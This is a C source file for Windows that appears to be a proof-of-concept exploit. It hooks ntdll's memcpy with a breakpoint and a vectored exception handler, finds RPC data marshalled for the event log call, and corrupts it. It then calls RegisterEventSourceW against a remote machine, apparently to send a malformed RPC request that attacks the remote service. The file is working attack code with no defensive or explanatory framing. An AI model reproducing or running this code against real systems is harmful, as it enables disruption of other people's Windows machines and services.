#include <Windows.h>
#include <winternl.h>
#include <stdio.h>

UINT_PTR gHookAddress;

LONG ExceptionHandler(EXCEPTION_POINTERS* ExceptionInfo) {
    UINT8* Src = ExceptionInfo->ContextRecord->Rdx, *Dst = ExceptionInfo->ContextRecord->Rcx;

    // ignore exceptions that do not belong to our hook
    if (ExceptionInfo->ContextRecord->Rip != gHookAddress) {
        return EXCEPTION_CONTINUE_SEARCH;
    }

    // emulate overwritten instruction
    ExceptionInfo->ContextRecord->Rax = ExceptionInfo->ContextRecord->Rcx;
    ExceptionInfo->ContextRecord->Rip += 3;

    if (!Dst || !Src) {
        return EXCEPTION_CONTINUE_EXECUTION;
    }

    // corrupt data that was marshalled by Ndr64ConformantVaryingArrayMarshall
    Dst = Dst - 0x38;
    if (memcmp(Dst, "\x00\x00\x02\x00\x00\x00\x00\x00\x44\x00\x00\x00", 12) ||
        memcmp(Src, L"1337", 4 * sizeof(wchar_t))) {
        return EXCEPTION_CONTINUE_EXECUTION;
    }

    printf("Found RPC data, corrupting...\n");

    memset(Dst, 0, 0x40);

    *(Dst + 7) = 1;
    *(Dst + 18) = 1;

    return EXCEPTION_CONTINUE_EXECUTION;
}

void main() {
    VOID* Handler;

    // resolve hook target address
    gHookAddress = (UINT_PTR)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "memcpy");
    if (!gHookAddress) {
        return;
    }

    // install exception handler
    Handler = AddVectoredExceptionHandler(1, ExceptionHandler);
    if (!Handler) {
        return;
    }

    // place breakpoint on memcpy
    if (!WriteProcessMemory(GetCurrentProcess(), (VOID*)gHookAddress, (VOID*)"\xCC", 1, NULL)) {
        return;
    }

    RegisterEventSourceW(L"DESKTOP-...", L"1337");

    while (TRUE) {
        Sleep(1000);
    }
}

